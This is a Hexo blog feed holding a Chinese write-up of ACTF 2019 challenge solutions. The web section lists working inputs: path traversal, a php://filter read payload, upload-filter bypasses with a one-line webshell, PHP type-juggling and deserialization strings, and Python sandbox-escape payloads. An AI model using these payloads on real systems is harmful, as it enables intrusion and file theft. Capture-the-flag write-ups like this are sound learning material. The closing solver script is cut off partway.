<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[XTXTMTXTX]]></title>
  <subtitle><![CDATA[闲置用]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="https://www.xtxtmtxtx.xyz/"/>
  <updated>2019-05-24T04:26:07.411Z</updated>
  <id>https://www.xtxtmtxtx.xyz/</id>
  
  <author>
    <name><![CDATA[XTXTMTXTX]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[ACTF 2019]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/ACTF%202019/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/ACTF 2019/</id>
    <published>2019-05-23T16:00:00.000Z</published>
    <updated>2019-05-24T04:26:07.411Z</updated>
    <content type="html"><![CDATA[<p>代码之后会放在 <a href="https://github.com/XTXTMTXTX/ACTF-2019" target="_blank" rel="external">https://github.com/XTXTMTXTX/ACTF-2019</a><br>
一度第一名最后第四名，还喜提大一第二 <del>我哭了 你呢.jpg</del></p>
<hr>
<h2 id="trivial"><a class="header-anchor" href="#trivial">¶</a>Trivial</h2>
<h5 id="welcome-social-media-questionnaire"><a class="header-anchor" href="#welcome-social-media-questionnaire">¶</a>Welcome, Social Media, Questionnaire</h5>
<p>签到、签退题，不多说</p>
<hr>
<h5 id="shell-master"><a class="header-anchor" href="#shell-master">¶</a>Shell Master</h5>
<p>nc连接上服务器之后先要求你提供 Auth Token （来自于网页，身份验证）。其实是个shell，但是几乎什么提示都没有，很容易蒙圈。联系题名输入 ls 发现蹦出了结果，好了 cat flag 完事。</p>
<hr>
<h5 id="proof-of-work"><a class="header-anchor" href="#proof-of-work">¶</a>Proof of Work</h5>
<p>要你输入 hash 值后六位与他给出的相匹配，时限 30s 。题目 Hint 是暴力<br>
但我打了个 300mb 的表。cat grep 出解</p>
<hr>
<h5 id="asm-tour"><a class="header-anchor" href="#asm-tour">¶</a>Asm Tour</h5>
<p>照着给的 asm 里的注释一步步来就可以了，但我一开始没看到题目的问题在哪里。其实不用读完整个 asm ，到他要你求的寄存器的那几行代码上下翻看一下就出来了（当然要先读得懂）。</p>
<hr>
<h5 id="getting-started-with-blockchain-ethereum"><a class="header-anchor" href="#getting-started-with-blockchain-ethereum">¶</a>Getting Started with Blockchain Ethereum</h5>
<p>给了个 MOOC 链接，我去看了一下<del>（并通过了第一周的学习任务）</del>。其实把他给的虚拟机环境下下来装好后直接照着里面的那个网页一步步操作下来就可以叻，我试的时候发现 Node 2 一直挖不出币，以为这是突破口。后来准备放弃之前直接交了 token 结果过了（当然之前我还 nc 地在 token 两旁加上了 ACTF{…} 结果 WA 。。看题目注释我以为是要自己加上格式）。</p>
<hr>
<h2 id="misc"><a class="header-anchor" href="#misc">¶</a>Misc</h2>
<h5 id="where-is-my-flag"><a class="header-anchor" href="#where-is-my-flag">¶</a>where is my flag</h5>
<p>pdf 密码爆破<br>
答案是 easy</p>
<hr>
<h5 id="broken-png"><a class="header-anchor" href="#broken-png">¶</a>broken png</h5>
<p>补上文件头，大概<br>
我忘了</p>
<hr>
<h5 id="smile"><a class="header-anchor" href="#smile">¶</a>Smile</h5>
<p>下下来运行<br>
当然要安装好需要的库 以及一个摄像头<br>
不知道为什么我的 ps3eye 它用不了<br>
反正笔记本自带的可以。它没识别我的脸 它觉得后面的柜子在笑<br>
反正然后就有 flag 了</p>
<hr>
<h5 id="arctic-tours"><a class="header-anchor" href="#arctic-tours">¶</a>Arctic Tours</h5>
<p>图片格式题<br>
拜读一下 format 文档把图片高改高即可 能看到被盖住的 flag<br>
因为 flag 的文字顶部有一点点从隐藏的地方露出来了</p>
<hr>
<h5 id="open-your-eyes"><a class="header-anchor" href="#open-your-eyes">¶</a>open your eyes</h5>
<p>这又是啥题来着。<br>
等附件可以下载了 or 我想起来了我再补到我的 blog 上去。<br>
反正应该也是水题</p>
<hr>
<h5 id="what-s-this-1-2-3"><a class="header-anchor" href="#what-s-this-1-2-3">¶</a>what’s this? 1 2 3</h5>
<p>都是区块链相关地址 好像<br>
百度一下 前两个比较好找 最后一个是 ZeroNet<br>
配置好环境连接就可以了<br>
国内访问可能需要梯子</p>
<hr>
<h5 id="catch-the-ghost"><a class="header-anchor" href="#catch-the-ghost">¶</a>Catch the Ghost</h5>
<p>卡了好久。<br>
以为是什么神秘隐写题。<br>
第一层 zip 包 用 16 进制编辑软件把前 4 个字节交换一下打开 发现有密码<br>
其实是位加密，修改标识位、强制解压都可以</p>
<p>最后得到一个 pdf ，全文复制粘贴出来发现隐藏文字<br>
把多出来的文字拼起来就有了</p>
<hr>
<h5 id="under-your-nose"><a class="header-anchor" href="#under-your-nose">¶</a>under your nose</h5>
<p>哈哈，这题我没删<br>
仔细观察发现图片上有矩阵一样的点，发现间距是固定的，调用 python 库把这些像素提取出来拼接得到 flag<br>
人生苦短 我用 Python</p>
<hr>
<h5 id="old-school"><a class="header-anchor" href="#old-school">¶</a>Old School</h5>
<p>古典加密<br>
我深夜做的 做吐了x<br>
好吧好吧 是我菜。<br>
第一行 Caesar 丢进 quipqiup 就出来了<br>
第三行 Vigenère 丢进 <a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">https://www.guballa.de/vigenere-solver</a> 也出来了<br>
第二行我没头绪 到处找网站尝试解码 结果 <a href="rumkin.com">rumkin.com</a> 试到 Railfence 的时候出来了 很幸运。</p>
<hr>
<h5 id="flag-above-this-page"><a class="header-anchor" href="#flag-above-this-page">¶</a>flag above this page</h5>
<p>hint 简单粗暴<br>
查看 ssl 证书发现了隐藏域名 但是我解析不出来很崩溃<br>
后来搜索 Lets Encrypt 证书的时候看到其用 TXT 解析验证域名主人的时候我才想起来有这么个东西<br>
然后就好了 在线解析 txt 记录工具</p>
<hr>
<h5 id="xmas-ornaments-ranking"><a class="header-anchor" href="#xmas-ornaments-ranking">¶</a>Xmas Ornaments Ranking</h5>
<p>用 Win Hex 看到结尾的 Xmas Ornaments Ranking Key了，感觉是某种编码。然后才意识到题名缩写就是 XOR<br>
把开头字节和他给的 Key 异或一下就好了，结果得到个图片写着 flag</p>
<hr>
<h5 id="turtle"><a class="header-anchor" href="#turtle">¶</a>turtle</h5>
<p>给的 hint 是 adblocker 和去哪儿网反爬虫<br>
百度了一下发现反爬虫技术是和字体有关（我爬了个假文本）<br>
然后我从爬虫入手，假装自己是百度蜘蛛访问 turtle （事后好像发现不影响）<br>
然后发现浏览器下了个 eof 字体文件，先直接 16 进制编辑器打开，结果文件末尾的flag是假的。<br>
转成 ttf 打开之后发现字体对几个字母进行了替换，接着查看 turtle 下下来的文件，在 css 文件里有个 ad 的 style 以及一个看着像乱码的 content， 直接对照那个字体进行替换就可以了。<br>
但是那个字体不好认，但给了 flag md5 码，多试几次总能出来的。</p>
<hr>
<h5 id="pysandbox-6-10"><a class="header-anchor" href="#pysandbox-6-10">¶</a>pysandbox 6, 10</h5>
<p>CTF-Wiki 上给的例子大部分是 python 2.7 的，而题目用的是python 3.7，payload 不能混用。<br>
先是忘了在哪儿找到了个小魔法<br>
<code>·().__class__.__bases__[-1].__subclasses__()</code><br>
通过 <code>__dict__</code> 发现有个叫 FileLoader 的东西，进一步探索发现可以输出文件内容<br>
构造<br>
<code>[x for x in ().__class__.__bases__[-1].__subclasses__() if x.__name__ == 'FileLoader'][0].get_data('','flag')</code><br>
过了 6<br>
10 没几个人过，我以为很难。结果本地发现这个还是能用的，远程之后发现也是能用的，于是双倍经验。<br>
大概不是期望解法？所以原本该怎么做</p>
<hr>
<h5 id="you-can-you-up"><a class="header-anchor" href="#you-can-you-up">¶</a>You can you up</h5>
<p>mc 题<br>
我只要一直跳跳跳就能拿到 flag 了！！！！<br>
开个玩笑。<br>
一开始是想直接获取 3d 模型，结果发现 mc 的提取比较难。<br>
后来在网上找到了可以 dump 服务器地图的 mod，火速下载之，能用<br>
接下来本地开那张图 gamemode 改一下飞上天就拿到 flag 了<br>
本着增进室友关系的理念，我和我一个室友连进服务器玩了个把小时</p>
<hr>
<h5 id="turtle-v2"><a class="header-anchor" href="#turtle-v2">¶</a>turtle</h5>
<p>给的 hint 是 adblocker 和去哪儿网反爬虫<br>
百度了一下发现反爬虫技术是和字体有关（我爬了个假文本）<br>
然后我从爬虫入手，假装自己是百度蜘蛛访问 turtle （事后好像发现不影响）<br>
然后发现浏览器下了个 eof 字体文件，先直接 16 进制编辑器打开，结果文件末尾的flag是假的。<br>
转成 ttf 打开之后发现字体对几个字母进行了替换，接着查看 turtle 下下来的文件，在 css 文件里有个 ad 的 style 以及一个看着像乱码的 content， 直接对照那个字体进行替换就可以了。<br>
但是那个字体不好认，但给了 flag md5 码，多试几次总能出来的。</p>
<h2 id="web"><a class="header-anchor" href="#web">¶</a>Web</h2>
<h5 id="game-1-2-3-4"><a class="header-anchor" href="#game-1-2-3-4">¶</a>Game 1, 2, 3, 4</h5>
<p>善用 F12 工具 以及自带的网络分析工具<br>
还有 Fiddle<br>
1 的 flag 藏在响应头里，</p>
<p>2 先是 Fiddle 查看 302 跳转时的相应找到密码<br>
bpu 给页面下断点 改 Refer 为 localhost<br>
第三个页面有个 admin = 0 的 cookie 改成 1 重发请求</p>
<p>3 robot.txt 得到密码<br>
然后我卡关了。<br>
后来找了个 ctf 专用扫描器 发现 images 文件夹存在，且可见 password txt 文件<br>
第三关查看源代码发现 include 了 password.inc<br>
直接访问该文件 f12 找到密码</p>
<p>4 先看网站代码注释的提示，得知和 vim 备份有关<br>
下载 <code>.index.php.swp</code><br>
用 vim -r 打开得到密码<br>
然后是网页遍历。先用 fiddle 给请求加上 cookie，再通过 fiddle 使 idm 能下载页面<br>
然后直接从 id 1 下到 1000<br>
发现 98 的时候文件大小就不一样， 打开得解。<br>
查看网页注释 得知是 .git 泄露<br>
GitHack 跑一下就好了，记得通过 fiddle 修改 cookie 访问，不然会调转到登录，软件就没法正常访问网页了。</p>
<hr>
<h5 id="file-inclusion-1-2"><a class="header-anchor" href="#file-inclusion-1-2">¶</a>file inclusion 1, 2</h5>
<p>1 比较水，给 <code>/data/flag</code> 前加几次 <code>../</code> 就遍历到了 flag 文件<br>
2 使用 php filter 防解析<br>
<code>page=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
得到结果 base64 解一下就好了</p>
<hr>
<h5 id="upload-1-2-3-4"><a class="header-anchor" href="#upload-1-2-3-4">¶</a>Upload 1, 2, 3, 4</h5>
<p>1 上传 php 之前把 <code>onsubmit=&quot;return checkFile()&quot;</code> 清了。 直接 Fiddle bpu 截获，修改请求头 为正常的 image 就过了<br>
2 过滤后缀名，会把php清理掉，于是构造后缀名为 pphphp 即可，被过滤后反而成了 php 文件<br>
3 把代码复制到正常 png 文件结尾处，后缀名改 <code>空格php</code> 提交即可<br>
4 题目注释给了条件，发现php是先保存到文件夹后才判断文件有没有问题，所以是条件竞争题。<br>
直接用 Bp intruder 不停发送请求，再在本地不停用 python 尝试在删之前访问 php，构造 php 直接读 flag 文件。</p>
<p>php 写什么？一句话木马、只是读文件，都可以。</p>
<hr>
<h5 id="baby-php"><a class="header-anchor" href="#baby-php">¶</a>baby php</h5>
<p>构造：<br>
<code>?1=0e215962017&amp;2=1&amp;3=2&amp;result=4c1b50b5579037f7e0b3c4e067d9735e440772cb&amp;lucky[]=2</code><br>
1 的值怎么来的呢，本地跑满足 (0eNUMBERS)==md5(0eNUMBERS) 的 NUMBERS，得 215962017，因为弱类型会把他们当数字处理，结果就都等于 0 了。<br>
flag 后半段，构造 lucky[]=2 会导致 <code>hash_hmac('ripemd160', $lucky, $salt);</code> 返回空，于是 salt 对 hash 就无影响了，随便整个 2 和 3，接下来 的 result 就是可被我们计算的了。</p>
<hr>
<h5 id="another-php"><a class="header-anchor" href="#another-php">¶</a>another php</h5>
<p>构造 <code>?%41AA_Bravo[]=1&amp;AAA=O:3:&quot;AAA&quot;:2:{s:6:&quot;melody&quot;;s:3:&quot;aaa&quot;;s:4:&quot;flag&quot;;R:2;}</code><br>
<code>%41AA_Bravo[]=1</code> 绕过字符串限制，将AAA_Bravo存成数组可绕过对 AAA_Bravo 大小的检测。<br>
后半段则是构造 Object 使得 melody 与 flag 同时一起改变，于是得到最终的 flag</p>
<hr>
<h5 id="eyes-can-lie"><a class="header-anchor" href="#eyes-can-lie">¶</a>eyes can lie</h5>
<p>开局一张图，flag全靠猜x<br>
好吧，点进去是一个机器人图像，联想到 robots.txt<br>
robots.txt 发现了 一个 remember_to_delete_this.php 但是打开无奈 404<br>
等一下，真的是 404 吗？<br>
访问别的页面的时候发现 404 长得不一样，于是肯定就是伪装的了，F12 分析得到 super_secret.log<br>
这文件看着像一堆乱码，先url解码<br>
解码完发现是一堆 SQL 注入的访问，先把注释符啥的都删了，只留下 SQL 注入和对应的时间（使用在线正则表达式比较方便）<br>
对于每条语句，查了一下发现其实就是在循环取字符串中每个字符的每一位，该位上是 1 则 Sleep 两秒。于是乎结合 log 中前后语句的时间间隔可以推出除了最后一位的字符串上的每一位，最终求出 flag 。懒得写代码，于是我手推了好一会儿。</p>
<hr>
<h2 id="reverse"><a class="header-anchor" href="#reverse">¶</a>Reverse</h2>
<h5 id="real-babyrev"><a class="header-anchor" href="#real-babyrev">¶</a>real babyrev</h5>
<p>IDA F5<br>
Y0u_4re_7he_B3st</p>
<hr>
<h5 id="real-childrev"><a class="header-anchor" href="#real-childrev">¶</a>real childrev</h5>
<p>F5<br>
<code>~M|@juJ@K@\&quot;@]G\\z</code> 与 0x1F 异或一下</p>
<hr>
<h5 id="easy-reverse"><a class="header-anchor" href="#easy-reverse">¶</a>easy reverse</h5>
<p>打开先 F5，代码有点怪。分析了一下发现 main 中 第一个判断是判断输入是否为 18 位 ACTF 开头字符串，sub_401367() 是输出函数，然后 CreateTread 的其实就是第二部分的验证。进入StartAddress观察，发现其实就是判断输入的第 5 ~ 18 位字符异或 97 是否与已知数相同。于是直接把四个判断的四个数字复制出来，先每四字节分别字节翻转（小端序），再每个字节异或 0x97 就得到了要输入的内容，也就是 flag</p>
<hr>
<h5 id="md5-hacker"><a class="header-anchor" href="#md5-hacker">¶</a>md5 Hacker</h5>
<p>F5，程序流程是先读32长的字符串到 0x601160 中并判断是否符合格式，接着进入主要的 sub_4009AB() 部分。进入 sub_400896 可知该函数对一个4位字符串求 MD5 码并存到另一个字符串里。综上，题目是将输入的 32 位字符串分成 8 组，每组分别求 MD5 码，再将 MD5 与 <code>r_u_a_md5_hacker</code> 异或，并与已知的 unk_6010A0 + 16 * i 比较。逆推的话先将 unk_6010A0 开始的 16 * 8 个字符串从程序中复制出来并依次与 <code>r_u_a_md5_hacker</code> 异或，得到 8 组 md5 ，再在在线 md5 解密网站分别解密（或者本地打表，每次就四位），依次拼接起来两边加上 ACTF{…} 就是 flag 了</p>
<hr>
<h5 id="endless-elf"><a class="header-anchor" href="#endless-elf">¶</a>Endless ELF</h5>
<p>观察发现代码中 <code>qword_6010A0 = sub_4005F6(0xAAALL);</code> 极度影响程序速度，因为是不断地在递归运算。将 sub_4005F6 反编译的代码复制出来，加入记忆化搜索优化，输出解为 0x45793CEED72DAC19 。接着回到这个程序，把 <code>call sub_4005F6</code> Patch 掉，丢到虚拟机里远程调试，手动修改 qword_6010A0 值为上述数字就得到 flag 了。<br>
PS: 因为是 64 位数字，本地跑的时候要用 <code>%llX</code> 输出<br>
PSS: 其实也可以直接 patch <code>mov rax, 45793CEED72DAC19h</code> 上去， ida 自带的 patch 比较鸡肋不能这么汇编，强烈推荐 Keypatch 111111</p>
<hr>
<h5 id="babyrev"><a class="header-anchor" href="#babyrev">¶</a>babyrev</h5>
<p>乍一眼看上去一堆 while 和 goto 引起强烈不适。仔细思考，冷静分析，可以发现大部分代码不过是在求字符串 s 中每个字母在 a0123456789abcd 中的下标，也就是特殊映射过的字母转数字。进一步观察会发现 sub_950(a1, a2, a3) 所做的事是将 a1 看作行优先的 37*37 的矩阵，a2 看作列向量，并将 mod 79 下的  a1*a2 存入 a3。a1 是 aFourScoreAndSe 中的文本转数字，a2 是 flag 的文本转数字，a3 是得到的。问题转化为 a1、a3 已知求 a2。于是在模意义下求 a1 的逆矩阵，最终求个 (a1)^-1*a3 即为 flag 转为数字后的样子，再转回去就行了。<br>
至于模意义下的求逆矩阵，直接高斯消元法即可。因为79是素数，因此 1~78 每个数都有不同的乘法逆元，只要把高斯消元里的除改成乘逆元即可。</p>
<hr>
<h5 id="aaa-maker"><a class="header-anchor" href="#aaa-maker">¶</a>AAA Maker</h5>
<p>是个游戏。<br>
反编译找比较关键的函数，最后找到要输入 <em>神奇语句</em> 得到什么什么什么。进一步观察发现是对一块空间用输入循环异或后直接调用，因此从函数开头的共同特点入手。<br>
将解密前的函数头与其他的函数头复制出来，将前7位应该很可能解密后是一样的字节异或，得到 Key <code>Hav3FuN</code>，然而对于接下来象征栈空间大小（应该是这个，我猜的）的字节是不确定的，先拿这个 Key 异或一遍再说。结果再次反编译的时候就可以解析那个函数了，最后得到 flag。</p>
<hr>
<h5 id="strange-exe"><a class="header-anchor" href="#strange-exe">¶</a>Strange EXE</h5>
<p>是水题。是水题。是水题。是水题。<br>
做得很晚是因为不知道更新过附件了，其实早就找到 flag 了，然而是假的。<br>
下好文件先用 ida 打开，发现了奇怪的字符串，像 jar2exe 这种。于是下个 jar 反编译器，比如 jd-gui。直接把 exe 拖上去查看 Secret 类翻一翻就看到 flag 了，还是明文</p>
<hr>
<h5 id="findfunc"><a class="header-anchor" href="#findfunc">¶</a>findfunc</h5>
<p>apk 解包，用 ida 打开class什么什么文件发现关键函数（什么什么 Check，没错我又把程序删了），然后打开 .so 文件，找到了非常显眼的函数，发现了非常抽象的 (v3+676)(v3…) 什么的函数。直接修改对应变量的 type 为 JNIEnv* 他就变得正常了。<br>
发现了一个被 strcmp 的字符串 flag{xxxxxxx} 在手机上安装 apk，输入，显而易见不对。<br>
根据hint，找找别的函数，发现了一个调用了 mprotect 并将那个显眼的函数 jmp 到另一个函数的函数。推测 jmp 到的目标函数才是真正的函数。<br>
这个函数的逻辑大概是 sub_C000FB8 先将字符串 <code>&quot;Java_com_a_findfunc_MainActivity_check&quot;</code> 进行处理成 v9，再将 v9、输入的字符串一并用 sub_C001030 处理，最后和另一处存着的字节做对比。<br>
我懒得仔细观察那两个处理函数了，直接反编译、复制、粘贴、修改变量类型名使得通过编译。然后在本地模拟那个 check 函数的处理。<br>
分析得出，每个字符在被处理之后互不影响别的字符处理结果，于是可以一个个依次枚举，最多跑 256*24 次，很快就出 flag{} 了。把这个 flag 复制到程序里得到真正的 flag。<br>
PS：因为处理过程中的函数开小了结果爆栈调了很久。不能加边界判断真是坏文明（明明是你习惯不好）</p>
<hr>
<h2 id="crypto"><a class="header-anchor" href="#crypto">¶</a>Crypto</h2>
<h5 id="warm-up1"><a class="header-anchor" href="#warm-up1">¶</a>Warm Up1</h5>
<p>字符串看成两部分 l 和 r<br>
推推推推推推推推<br>
得到<br>
newl = k1 ^ r<br>
newr = k2 ^ l ^ r<br>
所以<br>
k1 = newl ^ r<br>
k2 = newr ^ l ^ r<br>
r = newl ^ k1<br>
l = newr ^ k2 ^ r = newr ^ k2 ^ newl ^ k1<br>
于是可以通过已知的 fake_flag 的明文密文先求出 k1 k2<br>
再用 k1 k2 求出flag</p>
<hr>
<h5 id="warm-up3"><a class="header-anchor" href="#warm-up3">¶</a>Warm Up3</h5>
<p>观察函数，发现每次操作都是将上一次结果左移一位，在最右边空出来的那位加上上次结果 &amp;mask 之后 1 的位的个数 &amp;1，最后取208位，于是可以逆推。<br>
每次操作先取出最右边那位记为 z，再看看左边 207 位右移一位再 &amp;mask 后有多少个1，记为 k ，如果 k&amp;z == 1 说明最左边缺了了个 1，否则缺了个0。于是操作 208 次就是原先的 flag</p>
<hr>
<h5 id="warm-up4"><a class="header-anchor" href="#warm-up4">¶</a>Warm Up4</h5>
<p>存在一个映射 S(x) 将字符串中每个字符映射成另一个<br>
题目是先对字符串填充，然后8个一行，进行了随机次运算，最后再将列的顺序打散<br>
根据最后一行有四个 0x48 ，推测是 Sn(0x04)==0x48<br>
先求 R(S(x))=x<br>
于是 不断递推 slist=[chr(R[ord(i)]) for i in slist] 直到 0x48 变回了 0x04<br>
当然还是不对的，但是我们可以通过已知的字符和语义得到相应的列的顺序。<br>
剩下的就是继续逆推+md5验证字符串是不是所求 flag。</p>
<hr>
<h5 id="unsafe-ctr"><a class="header-anchor" href="#unsafe-ctr">¶</a>Unsafe CTR</h5>
<p>对每次加密，求 mj 使得 ci,j^mj 仍然是可读字符串的范围，最后从后往前猜词即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">cs=[<span class="string">'167c7f4fff941dea1b0b97f49e6d51fea7878c281f8d981e4fb358051eefac10c140327c77ad640bed157fa1c93717485d777d916be782732095fee4c21ca0ea56f248a5b8a0398950f38117877c1ac8b17f758af1e0f08e26b5e86d28137b'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'177d3349e5cb49a70e4292f0d37c1eb7bdc9b71e26aedd5d1bb35f0408efba55c04c30747cf93e4497507cb09b251d514a6b7d946ba18f6e2299b0fa8d1defa256f70dc9b0ee6cd107f59c538b605cdbbc3c21d9c2cfdc8044f2a8367e1d3a'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'11777f48e5950cea1804dce2cb7a56feb8889f3808c79b1249fe4b060daaed51df0f0b717cf91842dd156af5bd21586a406036c32eee95210693b0c6830ba7ea63e90dc986a6239d15baa0529d6756daf073678adec7d68e26bde47725413a'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'7f387f05aab001ab03428bf49e694cb1ad85992400c7dd5d52e01e3e04aaed62c548376d398d250bed1872b9c40c1d5441757dc359e48b6d7fbef5ea8c0fefac58f348a8bda26dd15dbaa65f8b3279c1be6d74cfc5da85c10cfcc46a355270'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1b777f5ce59249ab1b0edce5d67050b5ee9d902c19c7891552e01e0904aea35ec9437f7178aa6a49df1870f58b3c1d5c4c7a388731a1a9603adcfff69048a3af5be0068df1bb229806ba914597624ec1f07b74d396c7d68e1eb3f6383f5534'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'16767f51e28e1aea1a0d98f49e394ab6abc991230493941c57b3480f0fbba2428c66093970aa6a59df0d7bb49d2b1c515632388d6df39e712699f4a39607efa555f50980bfee2dd103ff861781741ad8b17074cfc58effc74abdf538365c78'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'16757f56e5951bb3572f9de3d77612feac9c8c6d2ea8b32974c0714a3c9d847eef6a0c4a39b0390bd3133eb4c92a115b49772f8660f5c7673d8ef5f09649efe717d21f80b7ba039f23ff91429c7b4ed7f04860d3969c959f5ff1b62b7d012d'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1e6c7f4ae48249ba180b92e59e501ea9af9ad82908859c0952fd594a1ba7a844c44a2d3976ab6a45d5093ea1866e19594b32298b6ba1b24210b1d6c8ae3cefa958f11199b0bd389050f59c17867748cbf07e74de96e785c60baae338245c7b'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'326d3c4daa940ca611428ef4cd695bbdbac7d8000c8c94135cb34c0b02aba25d8c43306b7cb46a42ca0e6bb8c9270b1d4e7129966fed8b78729db0ef8d1cefa256f30c8ca3ee389911f4d25880771ad9bf696dce96dacdc704b7a66c325b34'</span>.decode(<span class="string">'hex'</span>),</span><br><span class="line"><span class="string">'1e5b0b63a49006a7120c9af4d06a56b1bb8b99611a888f1c55f4590f05a4a442cd01'</span>.decode(<span class="string">'hex'</span>)]</span><br><span class="line"></span><br><span class="line">dict=<span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">dict+=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">dict+=<span class="string">'0123456789'</span></span><br><span class="line">dict+=<span class="string">'!?-., '</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> keylenth <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">96</span>):</span><br><span class="line">    k=[]</span><br><span class="line">    passw=[]</span><br><span class="line">    <span class="keyword">for</span> jjj <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        k+=[&#123;&#125;]</span><br><span class="line">        passw+=[[]]</span><br><span class="line">    flag=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cs[i])):</span><br><span class="line">            k[j%keylenth][cs[i][j]]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(keylenth):</span><br><span class="line">        flag1=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            flag2=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> k[i]:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span>(chr(ord(l)^j) <span class="keyword">in</span> dict):</span><br><span class="line">                    flag2=<span class="number">0</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag2):</span><br><span class="line">                flag1=<span class="number">1</span></span><br><span class="line">                passw[i]+=[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(flag1):</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> keylenth</span><br><span class="line">        <span class="keyword">print</span> passw</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">print</span> i,passw[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>):</span><br><span class="line">        <span class="keyword">if</span> len(passw[i])==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> i,passw[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(input1,input2)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        ps=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cs[i])):</span><br><span class="line">            <span class="keyword">if</span> j==input1:</span><br><span class="line">                ps+=chr(passw[input1][input2]^ord(cs[i][j]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span>(len(passw[j])==<span class="number">1</span>):</span><br><span class="line">                    ps+=chr(passw[j][<span class="number">0</span>]^ord(cs[i][j]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ps+=<span class="string">'?'</span></span><br><span class="line">        <span class="keyword">print</span> ps</span><br><span class="line"></span><br><span class="line">            k[j%<span class="number">95</span>][cs[i][j]]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(input1,input2)</span>:</span></span><br><span class="line">    passw[input1]=passw[input1][input2:input2+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">Id just like to interject for a moment. What youre referring to as Linux is in fact GNU Linux o</span><br><span class="line">Hello, my name is OSKI    and welcome to--berkeley we 